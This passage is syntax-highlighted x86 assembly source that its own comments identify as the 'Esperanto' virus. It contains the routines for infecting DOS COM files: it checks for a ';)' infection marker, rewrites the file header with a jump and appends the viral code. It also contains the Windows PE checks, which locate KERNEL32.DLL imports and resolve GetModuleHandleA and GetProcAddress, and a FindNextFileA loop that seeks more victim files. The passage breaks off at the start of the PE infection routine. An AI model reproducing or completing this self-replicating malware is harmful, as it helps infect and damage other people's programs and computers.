                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">espo_start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; Check if the COM file has been previously</span><span class="sc0">
                </span><span class="sc1">; infected by Esperanto (winky ";)" smiley)</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ COM files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">check32_com</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">');'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; If not, set the file flag, increment the</span><span class="sc0">
                </span><span class="sc1">; infection counter and memory map the file</span><span class="sc0">
                </span><span class="sc1">; with our size previously added</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ COM files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">infect32_com</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_flag</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inf_counter</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unmap_close</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">],\
</span><span class="sc0">                                                </span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_map_file</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_good</span><span class="sc0">

                </span><span class="sc1">; Store old COM header in our buffer</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_com_header</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc1">; Calculate the jump to the COM and EXE</span><span class="sc0">
                </span><span class="sc1">; entry point of the virus (once appended)</span><span class="sc0">
                </span><span class="sc1">; and store it in the buffer of the new</span><span class="sc0">
                </span><span class="sc1">; COM header ("0e9h,?,?,;)"). Then copy</span><span class="sc0">
                </span><span class="sc1">; it to the first five bytes of the file</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_com_header</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc1">; And finally append the viral code to</span><span class="sc0">
                </span><span class="sc1">; the end of the COM file, unmap it and</span><span class="sc0">
                </span><span class="sc1">; go look for more files to infect</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">espo_start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; Check if the new EXE file is a PE, by</span><span class="sc0">
                </span><span class="sc1">; first comparing the starting doubleword</span><span class="sc0">
                </span><span class="sc1">; of the new header with "PE"</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ PE files check routine (I) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">check32_pe</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EP'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; If this is ok, now check if the file is</span><span class="sc0">
                </span><span class="sc1">; executable and if it is not a DLL</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; Get number of sections of the PE file</span><span class="sc0">
                </span><span class="sc1">; and then point the first section with EDI</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">s_img_section</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_DataDirectory\
</span><span class="sc0">                                          </span><span class="sc5">.DE_Import\
</span><span class="sc0">                                          </span><span class="sc5">.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc1">; Now we're looking for the section in which</span><span class="sc0">
                </span><span class="sc1">; the import table is found. This is usually</span><span class="sc0">
                </span><span class="sc1">; the .idata section, but we make sure by</span><span class="sc0">
                </span><span class="sc1">; means of checking if the address of the</span><span class="sc0">
                </span><span class="sc1">; imports directory is inside this section</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">section_ok</span><span class="sc0">

                </span><span class="sc1">; In case it's not, we point to the header</span><span class="sc0">
                </span><span class="sc1">; of the next section with EDI, and keep on</span><span class="sc0">
                </span><span class="sc1">; doing the same until we find it</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">s_img_section</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; Now get a pointer to the first import</span><span class="sc0">
                </span><span class="sc1">; module descriptor in EAX so we may</span><span class="sc0">
                </span><span class="sc1">; look for KERNEL32.DLL thru this array</span><span class="sc0">

</span><span class="sc5">section_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">; Get the RVA of the Import Module</span><span class="sc0">
                </span><span class="sc1">; Descriptor in ESI and later check</span><span class="sc0">
                </span><span class="sc1">; if it actually exists or not (=0)</span><span class="sc0">

</span><span class="sc5">next_imd_img</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ID_Name</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel32_n</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; Now get the address of the name of</span><span class="sc0">
                </span><span class="sc1">; the IMD and check if it's the one</span><span class="sc0">
                </span><span class="sc1">; we're looking for (KERNEL32.DLL)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">; Get a character from ESI, check its case,</span><span class="sc0">
                </span><span class="sc1">; convert it if necessary to uppercase and</span><span class="sc0">
                </span><span class="sc1">; then compare the strings pointed by ESI</span><span class="sc0">
                </span><span class="sc1">; and EDI, to see if we find KERNEL32.DLL</span><span class="sc0">

</span><span class="sc5">dll_loop</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">check_char</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc12">'a'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">check_char</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">more_imd_img</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">dll_loop</span><span class="sc0">

                </span><span class="sc1">; Save the ID_ForwarderChain pointer in the</span><span class="sc0">
                </span><span class="sc1">; dynamic variable which corresponds to the</span><span class="sc0">
                </span><span class="sc1">; KERNEL32.DLL RVA, as we will need it to</span><span class="sc0">
                </span><span class="sc1">; find the base address of this module if</span><span class="sc0">
                </span><span class="sc1">; the calling process to GetModuleHandleA</span><span class="sc0">
                </span><span class="sc1">; was not successful (this is undocumented)</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ID_ForwarderChain</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Get the time/date stamp of KERNEL32.DLL</span><span class="sc0">
                </span><span class="sc1">; into EAX in order to compare it with the</span><span class="sc0">
                </span><span class="sc1">; corresponding stamp of the file we're</span><span class="sc0">
                </span><span class="sc1">; about to infect, as we don't want to hit</span><span class="sc0">
                </span><span class="sc1">; any binded executable PE file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">NT_FileHeader.FH_TimeDateStamp</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">

                </span><span class="sc1">; Determine if file is binded. If not, jump</span><span class="sc0">
                </span><span class="sc1">; and go find the RVA of the APIs needed in</span><span class="sc0">
                </span><span class="sc1">; the working process of Esperanto</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ID_TimeDateStamp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_rvas</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ File searching routine (FindNextFileA-based) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

                </span><span class="sc1">; Memory unmap file handled in EBX, check</span><span class="sc0">
                </span><span class="sc1">; the infection counter and, if everything</span><span class="sc0">
                </span><span class="sc1">; is ok, look for more files to infect</span><span class="sc0">

</span><span class="sc5">unmap_n_close</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unmap_close</span><span class="sc0">
</span><span class="sc5">find_next</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inf_counter</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jump_to_host</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">srchandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">findnext_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">check_victim</span><span class="sc0">

                </span><span class="sc1">; Nothing else to do, close the search</span><span class="sc0">
                </span><span class="sc1">; handle and jump to the original entry</span><span class="sc0">
                </span><span class="sc1">; point of the code of our host</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">srchandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">findclose_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">jump_to_host</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ PE files check routine (II) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

                </span><span class="sc1">; Go to next imported module descriptor</span><span class="sc0">

</span><span class="sc5">more_imd_img</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_imd_img</span><span class="sc0">

                </span><span class="sc1">; Now let's go for GetModuleHandleA. We</span><span class="sc0">
                </span><span class="sc1">; need the RVA of this API because it is</span><span class="sc0">
                </span><span class="sc1">; necessary to call it in order to know</span><span class="sc0">
                </span><span class="sc1">; the base address of KERNEL32.DLL</span><span class="sc0">

</span><span class="sc5">find_rvas</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gmhandle_n</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">look4name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gmhandle_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Our next and last objective is the API</span><span class="sc0">
                </span><span class="sc1">; GetProcAddress, which helps us in order</span><span class="sc0">
                </span><span class="sc1">; to find the address of any API we look</span><span class="sc0">
                </span><span class="sc1">; for of a given module or library</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gpaddress_n</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">look4name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gpaddress_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ PE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

                </span><span class="sc1">; Increment infection counter and remap our</span><span class="sc0">
                </span><span class="sc1">; victim in memory with the virus size added</span><span class="sc0">

